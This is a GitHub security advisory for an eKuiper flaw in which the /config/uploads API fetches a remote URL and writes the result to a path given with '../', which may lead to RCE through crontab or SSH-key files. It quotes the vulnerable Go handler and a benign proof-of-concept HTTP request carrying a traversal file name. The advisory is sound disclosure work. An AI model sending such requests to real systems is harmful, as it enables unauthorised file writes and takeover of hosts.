# [H] eKuiper /config/uploads API arbitrary file writing may lead to RCE

## Summary
Severity: High
Advisory: GHSA-gj54-gwj9-x2c6
CWE: CWE-434
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-07-03
Source: https://github.com/advisories/GHSA-gj54-gwj9-x2c6
Type: github-advisory

## Affected
- Go: `github.com/lf-edge/ekuiper/v2` — affected >=0 <2.2.0
- Go: `github.com/lf-edge/ekuiper` — affected >=0

## Details
### Summary
eKuiper /config/uploads API supports accessing remote web URLs and saving files in the local upload directory, but there are no security restrictions, resulting in arbitrary file writing through ../. If run with root privileges, RCE can be achieved by writing crontab files or ssh keys.

### Details
```go 
func fileUploadHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	// Upload or overwrite a file
	case http.MethodPost:
		switch r.Header.Get("Content-Type") {
		case "application/json":
			fc := &fileContent{}
			defer r.Body.Close()
			err := json.NewDecoder(r.Body).Decode(fc)
			if err != nil {
				handleError(w, err, "Invalid body: Error decoding file json", logger)
				return
			}
			err = fc.Validate()
			if err != nil {
				handleError(w, err, "Invalid body: missing necessary field", logger)
				return
			}

			filePath := filepath.Join(uploadDir, fc.Name)
			err = upload(fc)
```
- The fc.Name parameter do not safely filtered.

### PoC
```
POST /config/uploads HTTP/1.1
Host: localhost:9081
Content-Type: application/json
Content-Length: 89

{
  "name": "../../../../tmp/success",
 "file": "http://192.168.65.254:8888/success"
}
```
![image](https://github.com/user-attachments/assets/9ac23194-f5fd-49d3-ba54-334a7831739a)

### Impact

Tested and verified only on 1.14.3 and 1.14.1, theoretically all versions using this code could be affected.

1. SSRF
2. Path-Travel
3. May leads to RCE

The reporters is m0d9 from Tencent YunDing Lab.

## References
- https://github.com/lf-edge/ekuiper/security/advisories/GHSA-gj54-gwj9-x2c6
- https://github.com/lf-edge/ekuiper
